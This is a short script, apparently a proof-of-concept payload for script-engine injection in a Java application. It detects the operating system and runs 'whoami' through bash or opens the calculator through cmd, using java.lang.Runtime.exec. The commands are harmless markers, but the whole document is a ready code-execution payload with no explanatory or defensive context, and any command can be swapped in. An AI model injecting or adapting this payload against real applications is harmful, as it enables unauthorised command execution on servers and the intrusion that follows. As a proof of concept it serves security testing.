var strs = new Array(3);
if(java.io.File.separator.equals('/')) {
    strs[0] = '/bin/bash';
    strs[1] = '-c';
    strs[2] = 'whoami';
} else {
    strs[0] = 'cmd';
    strs[1] = '/C';
    strs[2] = 'calc';
}
java.lang.Runtime.getRuntime().exec(strs);
